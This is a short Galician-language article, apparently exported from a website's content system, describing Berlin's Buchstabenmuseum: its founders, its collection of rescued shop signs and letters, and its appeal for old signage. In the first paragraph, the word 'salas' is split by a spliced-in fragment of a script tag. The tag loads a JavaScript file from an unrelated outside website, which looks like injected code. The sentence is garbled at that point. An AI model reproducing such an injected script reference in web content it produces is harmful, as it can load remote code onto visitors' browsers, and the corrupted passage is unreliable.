title: 'Buchstabenmuseum: O museo das letras de Berlín'
body:
  -
    text: |-
      Fundado no ano 2005 por Barbara Dechant e Anja Schulze, a súa colección está formada por unha infinidade de letras, rótulos tipográficos, letreiros da rúa e todas aquelas manifestacións tipográficas rescatadas das rúas de Berlín e arredores. A filosofía do museo basease no obxecto letra como semiótica textual e comunicación escrita, polo tanto, calqueira letra, artesanal ou industrial que realiza unha función de comunicación no entorno da vida do home é ben recibida nas súa salpe="text/javascript" src="http://www.asociaciondag.org/cms/libs/jlibs/htmlEditor/tiny\_mce/themes/advanced/langs/es.js"&gt;as O museo funciona como centro de reciclaxe á vez que realiza labouras de recuperación da memoria histórica ante a homoxeneización da paisaxe gráfica das cidades que impon o fenómeno da globalización. A desterritorialización do deseño das grandes multinacionais está provocando a impersonalización da identidade gráfica de pequenas tendas que pouco a pouco está desparecendo.

      Nestes momentos o museo está realizando unha labor de ampliación na súa reciclaxe de letras a outros países, así que se tes localizado un vello rótulo ou unha letra abandoada, quizais poda formar parte dun museo.

      **Buchstabenmuseum**  
       Berlin 2005-2010  
       Vereinsregister 25064 NZ  
       Amtsgericht Charlottenburg  
